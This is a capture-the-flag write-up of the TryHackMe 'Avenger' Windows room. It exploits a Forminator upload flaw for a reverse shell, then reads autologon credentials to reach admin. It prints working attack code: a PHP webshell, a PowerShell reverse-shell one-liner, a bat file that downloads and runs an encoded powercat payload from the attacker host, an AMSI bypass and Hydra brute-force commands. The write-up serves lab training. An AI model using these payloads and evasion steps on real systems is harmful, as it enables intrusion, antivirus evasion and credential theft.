# AVenger is patched - Forminator Upload → Powercat AV Bypass → Autologon Creds → Root

## Room Information

- **Platform:** TryHackMe
- **Room:** Avenger
- **Difficulty:** Medium
- **OS:** Windows


## Step 1 — Reconnaissance

Started with a full nmap scan:

```bash
nmap -sC -sV 10.80.159.229
```

Key findings:
- Port 80/443 — Apache/XAMPP running WordPress
- Port 3306 — MariaDB
- Port 3389 — RDP (machine name: GIFT)
- Port 5985 — WinRM
- Port 445 — SMB

Added the hostname to `/etc/hosts`:

```bash
echo "10.80.159.229 avenger.tryhackme" | sudo tee -a /etc/hosts
```

---

## Step 2 — Web Enumeration

Ran Gobuster to find hidden directories:

```bash
gobuster dir -u http://avenger.tryhackme -w /usr/share/wordlists/dirb/common.txt
```

Found `/gift/` — a WordPress site. Also discovered `/dashboard/` showing a default XAMPP installation page and `/xampp/` which was blank.

Ran WPScan to enumerate plugins:

```bash
wpscan --url http://avenger.tryhackme/gift/ --enumerate p
```

Found **Forminator plugin version 1.24.1** — vulnerable to unauthenticated file upload (CVE-2024-28890).

---

## Step 3 — WordPress Login Brute Force (Unsuccessful)

Tried brute forcing the WordPress login with Hydra using the `admin` username:

```bash
hydra -l admin -P passwords.txt avenger.tryhackme http-post-form "/gift/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered for the username admin is incorrect" -V
```

Also used the difference in WordPress error messages between valid and invalid usernames to enumerate users:

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p dummy avenger.tryhackme http-post-form "/gift/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is not registered on this site" -V
```

Brute force was unsuccessful — moved on to other attack vectors.

---

## Step 4 — Enumerating Other Services (Unsuccessful)

Tried the following:
- SMB share enumeration with `smbclient` and `enum4linux`
- MySQL anonymous/root login on port 3306
- RDP brute force with Hydra
- WinRM access with `evil-winrm`

None of these yielded results.

---

## Step 5 — Forminator File Upload Discovery

Identified the Forminator form on the homepage sending AJAX requests:

```bash
curl -X POST http://avenger.tryhackme/gift/wp-admin/admin-ajax.php \
  -d "action=forminator_get_nonce"
```

Response:
```json
{"success":true,"data":"dffd9a8038"}
```

Identified the form ID from page source:

```bash
curl http://avenger.tryhackme/gift/ | grep -i "form_id"
```

**Form ID: 1176**

---

## Step 6 — PHP Webshell Upload (Unsuccessful)

Attempted to upload a PHP webshell via the Forminator form:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php

curl -X POST http://avenger.tryhackme/gift/wp-admin/admin-ajax.php \
  -F "action=forminator_submit_form_custom-forms" \
  -F "form_id=1176" \
  -F "forminator_nonce=dffd9a8038" \
  -F "name-1=test" \
  -F "email-1=test@test.com" \
  -F "upload-1=@shell.php;type=image/jpeg"
```

File uploaded successfully but shell was not accessible — PHP files were not being executed from the upload directory.

---

## Step 7 — Msfvenom Payload (Unsuccessful)

Generated a msfvenom PowerShell reverse shell and base64 encoded it:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.214.121 LPORT=4444 -f ps1 -o shell.ps1
cat shell.ps1 | iconv -t UTF-16LE | base64 -w 0 > shell.txt
```

Created a bat file to download and execute it. Windows Defender blocked execution.

---

## Step 8 — Raw Powercat (Unsuccessful)

Tried using powercat directly without encoding in the bat file. Windows Defender caught the signature and blocked it.

---

## Step 9 — Self-contained Bat File (Unsuccessful)

Tried embedding a raw TCP reverse shell directly in the bat file:

```bash
cat > ironman.bat << 'EOF'
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -c "$c='192.168.214.121';$p=4444;$client=New-Object System.Net.Sockets.TCPClient($c,$p);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
EOF
```

Windows Defender caught the signature and blocked it.

---

## Step 10 — Successful Initial Access — Powercat with `-ge` Flag

The key insight was using powercat's `-ge` flag which generates a fully encoded and obfuscated payload that bypasses Windows Defender.

**Generate encoded powercat payload:**

```bash
pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.214.121 -p 4444 -e cmd.exe -ge" > /tmp/shell.txt
```

**Create the bat file:**

```bash
cat > /tmp/ironman.bat << 'EOF'
START /B powershell -NonInteractive -c $stark=(New-Object System.Net.Webclient).DownloadString('http://192.168.214.121:8000/shell.txt');iex 'powershell -EncodedCommand $stark'
EOF
unix2dos /tmp/ironman.bat
cat /tmp/ironman.bat
```

**Start HTTP server and netcat listener:**

```bash
# Terminal 1
cd /tmp && python3 -m http.server 8000

# Terminal 2
nc -lvnp 4444
```

**Get nonce and upload bat file:**

```bash
curl -X POST http://avenger.tryhackme/gift/wp-admin/admin-ajax.php \
  -d "action=forminator_get_nonce"

curl -X POST http://avenger.tryhackme/gift/wp-admin/admin-ajax.php \
  -F "action=forminator_submit_form_custom-forms" \
  -F "form_id=1176" \
  -F "forminator_nonce=<NONCE>" \
  -F "name-1=test" \
  -F "email-1=test@test.com" \
  -F "upload-1=@ironman.bat"
```

Within 1-2 minutes the simulated user executed the bat file and a reverse shell was received:

```
whoami
gift\hugo
```

**User flag found at:** `C:\Users\hugo\Desktop\user.txt`

---

## Step 11 — Post Exploitation Enumeration

Found the script simulating the user clicking uploaded files:

```powershell
while ($true){ 
  Start-Sleep -Second 30;
  Get-ChildItem -Path "C:\\xampp\\htdocs\\gift\\wp-content\\uploads\\forminator\\1176_bfb25fcc9ab03b0c3d853234c0a45028\\uploads" | 
  ForEach-Object {Start-Process $_.FullName};
}
```

---

## Step 12 — Privilege Escalation — AMSI Bypass and PowerUp (Unsuccessful)

Attempted to run PowerUp.ps1 in memory:

```cmd
powershell -c "iex (New-Object Net.WebClient).DownloadString('http://192.168.214.121:8000/PowerUp.ps1');Invoke-AllChecks | Format-List"
```

Blocked by AMSI. Tried the standard AMSI bypass:

```cmd
powershell -c "[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)"
```

Access denied — insufficient privileges in the reverse shell.

---

## Step 13 — Successful Privilege Escalation — Manual Registry Enumeration

Manually checked the Winlogon registry key for plaintext credentials:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Found hugo's plaintext password stored in autologon:

```
DefaultUserName: hugo
DefaultPassword: REDACTED
```

---

## Step 14 — RDP Access and Root Flag

RDP'd into the machine as hugo:

```bash
xfreerdp /v:10.80.159.229 /u:hugo /p:'REDACTED' /dynamic-resolution
```

Hugo is a local admin. Used UAC prompt to elevate and access the Administrator desktop.

**Root flag found at:** `C:\Users\Administrator\Desktop\root.txt`

---

## Key Takeaways

- Forminator plugin had an unauthenticated file upload vulnerability
- The simulated user executing uploaded files mimics a real-world phishing attack
- Standard reverse shells and payloads were caught by Windows Defender
- AV evasion was achieved using powercat's `-ge` encoding flag which obfuscates the payload
- When automated tools like PowerUp are blocked by AV, manual enumeration is always an option
- Plaintext passwords stored in Windows autologon registry is a common misconfiguration
- Always check `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` during Windows privilege escalation
